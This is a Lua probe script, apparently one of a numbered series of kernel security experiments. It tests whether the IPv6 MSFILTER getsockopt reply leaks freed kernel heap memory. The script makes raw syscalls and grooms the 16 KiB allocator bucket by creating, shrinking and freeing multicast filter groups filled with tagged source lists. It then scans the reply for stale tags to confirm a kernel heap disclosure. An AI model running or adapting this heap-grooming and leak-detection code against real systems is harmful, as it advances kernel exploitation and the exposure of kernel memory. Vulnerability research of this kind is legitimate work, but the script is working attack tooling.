-- CRASH_CLASS: LOW
-- PROBE 1432a: is the MSFILTER readback tail a zero-fill or a reused allocation?
--
-- 1428a/1429a measured that getsockopt(41,74) copies `claim * 128` bytes and that
-- everything past the group's real entries reads as zero.  Two very different
-- mechanisms produce that:
--
--   Z  the kernel builds the reply in a freshly zeroed buffer  -> harmless
--   R  the kernel copies out of a buffer it did not zero        -> the tail is
--      whatever the allocator last held, which is a kernel heap disclosure as
--      soon as the previous owner is some other subsystem rather than our data
--
-- The way to tell them apart is to control the previous owner.  A group with 128
-- sources makes the kernel allocate a 16 KiB block and fill it with our tagged
-- source list.  Shrinking that group to one source frees the 16 KiB block with
-- our tags still in it.  If the next claim=128 readback comes back with those
-- tags in the tail, the reply is not zeroed (R).  If it comes back zero, the
-- kernel really does zero the reply (Z).
--
-- [D] then churns the 16 KiB bucket with tagged throwaway groups so that a
-- reuse test cannot pass merely because the freed block happened to be ours.
--
-- Prior art:
--   1427a results/phase36_realargs/1427a_msfilter_readback_20261109_162242.txt
--   1428a .../1428a_msfilter_readback_count_20261109_162635.txt
--       claim 0 -> 0 dwords, 1 -> 32 dwords, 128 -> 4096 dwords written
--   1429a .../1429a_msfilter_overread_20261109_162726.txt
--       tail is zero; a 64-group 1-source groom showed no sibling entries
--   50f results/phase11_network_attacks/50f_ipv6_msfilter_aligned_20261022_183727.txt

print("=== PROBE 1432a: MSFILTER TAIL REUSE TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function z(p, n) for i = 0, n - 1 do memory.write_byte(p + i, 0) end end
local function b(p, i, v) memory.write_byte(p + i, v) end
local function d(p, i, v) memory.write_dword(p + i, v) end
local function rd(p, i) return to_num(memory.read_dword(p + i)) end
local function rb(p, i) return to_num(memory.read_byte(p + i)) end

local AF_INET6, SOCK_DGRAM, IPPROTO_UDP, IPPROTO_IPV6 = 28, 2, 17, 41
local JOIN, LEAVE, MSFILTER = 12, 13, 74
local socket, getsockopt, setsockopt = sc(97), sc(118), sc(105)
local getpid = sc(20)

local function map(len, prot)
    local va = to_num(sc(477)(uint64(0), uint64(len), uint64(prot or 3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
    if va < 0x10000 or va > 0x8000000000 then return nil end
    return va
end

local req = memory.alloc(0x100)
local glen = memory.alloc(16)
local src = map(0x10000)          -- 512 sources
local dst = map(0x40000)          -- 256 KiB readback
assert(src and dst, "mmap failed")
local PAT = 0xA5A5A5A5
local WINDOW = 16384              -- dwords scanned = 64 KiB

local function fill_pat()
    for i = 0, WINDOW - 1 do memory.write_dword(dst + i * 4, PAT) end
end
-- self-check: the pattern must be readable back immediately, otherwise every
-- 'changed' count below is meaningless
local function pat_ok()
    local bad = 0
    for i = 0, WINDOW - 1 do
        if rd(dst, i * 4) ~= PAT then bad = bad + 1 end
    end
    return bad
end

local pid = to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("pid=%d src=0x%X dst=0x%X", pid, src, dst))
print("")

local function newsock()
    local fd = to_num(socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 or fd > 4096 then return nil end
    return fd
end

local function join(fd, tag)
    local m = memory.alloc(32)
    z(m, 32)
    b(m, 0, 0xff); b(m, 1, 0x02); b(m, 15, tag)
    d(m, 16, 1)
    local rv = -1
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(JOIN), uint64(m), uint64(20))
    end)
    if ok then rv = to_num(r) end
    return rv
end
local function leave(fd, tag)
    local m = memory.alloc(32)
    z(m, 32)
    b(m, 0, 0xff); b(m, 1, 0x02); b(m, 15, tag)
    d(m, 16, 1)
    local rv = -1
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(LEAVE), uint64(m), uint64(20))
    end)
    if ok then rv = to_num(r) end
    return rv
end

local function prep(tag, mode, nsrc, sa)
    z(req, 160)
    d(req, 0, 1)
    d(req, 4, mode)
    d(req, 8, nsrc)
    b(req, 16, 28)
    b(req, 17, AF_INET6)
    b(req, 24, 0xff); b(req, 25, 0x02); b(req, 39, tag)
    d(req, 16 + 24, 1)
    memory.write_qword(req + 144, uint64(sa or 0))
end

-- every source is 2001::<hi><lo>; hi is the generation tag so a stale block is
-- identifiable even after several generations of churn
local function fill_sources(n, hi, lo)
    local cap = n > 0 and n or 1
    z(src, cap * 128)
    for i = 0, cap - 1 do
        local e = src + i * 128
        b(e, 0, 28)
        b(e, 1, AF_INET6)
        b(e, 8, 0x20); b(e, 9, 0x01)
        b(e, 22, hi)
        b(e, 23, (lo + i) % 256)
        d(e, 24, 1)
    end
end

local function set_filter(fd, tag, n, hi, lo)
    fill_sources(n, hi, lo)
    prep(tag, 1, n, src)
    local rv = -999
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(MSFILTER),
            uint64(req), uint64(152), uint64(0))
    end)
    if ok then rv = to_num(r) end
    return rv
end

local function get_filter(fd, tag, claim)
    prep(tag, 1, claim, dst)
    fill_pat()
    d(glen, 0, 152)
    local rv = -999
    local ok, r = pcall(function()
        return getsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(MSFILTER),
            uint64(req), uint64(glen), uint64(0))
    end)
    if ok then rv = to_num(r) end
    return rv, rd(req, 8)
end

-- scan the reply for entry headers past the first entry, and record which
-- generation tag each one carries
local function tail_report()
    local headers, gens, nz = 0, "", 0
    for e = 1, 127 do
        local w = rd(dst, e * 128)
        if w == 0x00001C1C then headers = headers + 1 end
        local g = rb(dst, e * 128 + 22)
        if g ~= 0 and g ~= 0x00 then
            nz = nz + 1
            if gens:len() < 40 then gens = gens .. string.format("%02X@%d ", g, e) end
        end
        -- also flag any non-zero dword anywhere in the slot
        for i = 0, 31 do
            if rd(dst, e * 128 + i * 4) ~= 0 then
                if g == 0 then nz = nz + 1 end
                break
            end
        end
    end
    return headers, gens, nz
end

-- ---------------------------------------------------------------------
print("[A] pattern self-check (no syscall between fill and read)")
fill_pat()
print(string.format("  mismatched dwords immediately after fill: %d of %d", pat_ok(), WINDOW))
print("")

-- ---------------------------------------------------------------------
print("[B] arm the 16 KiB block: one group, 128 sources tagged 0xA0")
local fdA = newsock()
assert(fdA, "no socket")
local jA = join(fdA, 0x55)
local sA = set_filter(fdA, 0x55, 128, 0xA0, 0x00)
print(string.format("  socket=%d join=%d set(128 src)=%d", fdA, jA, sA))
do
    local rv, got = get_filter(fdA, 0x55, 128)
    local h, g, nz = tail_report()
    print(string.format("  claim=128 rv=%d numsrc=%d entries with headers=%d nonzero-slots=%d",
        rv, got, h, nz))
    print(string.format("  generation tags seen: %s", g))
    print(string.format("    entry0=%08X entry1=%08X entry127=%08X",
        rd(dst, 0), rd(dst, 128), rd(dst, 127 * 128)))
end

-- ---------------------------------------------------------------------
print("")
print("[C] shrink to 1 source -- this should free the 16 KiB block with 0xA0 in it")
print(string.format("  set(1 src)=%d", set_filter(fdA, 0x55, 1, 0xA0, 0x00)))
do
    local rv, got = get_filter(fdA, 0x55, 128)
    local h, g, nz = tail_report()
    print(string.format("  claim=128 rv=%d numsrc=%d entries with headers=%d nonzero-slots=%d",
        rv, got, h, nz))
    print(string.format("  generation tags seen: %s", g))
    print(string.format("    entry0=%08X entry1=%08X entry2=%08X",
        rd(dst, 0), rd(dst, 128), rd(dst, 256)))
    if h > 0 or nz > 0 then
        print("  >>> REUSE: the reply carries bytes that are not the real list")
    else
        print("  -> reply tail is zero even right after a 16 KiB block was freed")
    end
end

-- ---------------------------------------------------------------------
print("")
print("[D] churn the 16 KiB bucket with tagged data, then re-test")
do
    local churn = newsock()
    assert(churn, "no churn socket")
    local made = 0
    for i = 0, 31 do
        local tag = 0x60 + i
        if join(churn, tag) == 0 then
            if set_filter(churn, tag, 128, 0xB0 + i, 0x00) == 0 then made = made + 1 end
        end
    end
    print(string.format("  armed %d groups with 128 tagged sources (16 KiB each)", made))
    for i = 0, 31 do leave(churn, 0x60 + i) end
    print("  left them all -- 16 KiB blocks returned to the allocator holding 0xB0+i tags")
    -- shrink and re-read the observed group
    set_filter(fdA, 0x55, 1, 0xA0, 0x00)
    local rv, got = get_filter(fdA, 0x55, 128)
    local h, g, nz = tail_report()
    print(string.format("  claim=128 rv=%d numsrc=%d headers=%d nonzero-slots=%d", rv, got, h, nz))
    print(string.format("  tags seen: %s", g))
    if h > 0 or nz > 0 then
        print("  >>> REUSE CONFIRMED: freed filter blocks leak into the reply")
    else
        print("  -> still zero: the reply is zero-initialised, not recycled")
    end
end

-- ---------------------------------------------------------------------
print("")
print("[E] control: claim=1 on the same group must show exactly one entry")
do
    local rv, got = get_filter(fdA, 0x55, 1)
    local changed = 0
    for i = 0, WINDOW - 1 do
        if rd(dst, i * 4) ~= PAT then changed = changed + 1 end
    end
    print(string.format("  claim=1 rv=%d numsrc=%d changed-dwords=%d (expect 32)", rv, got, changed))
end

print("")
print("=== PROBE 1432a COMPLETE ===")
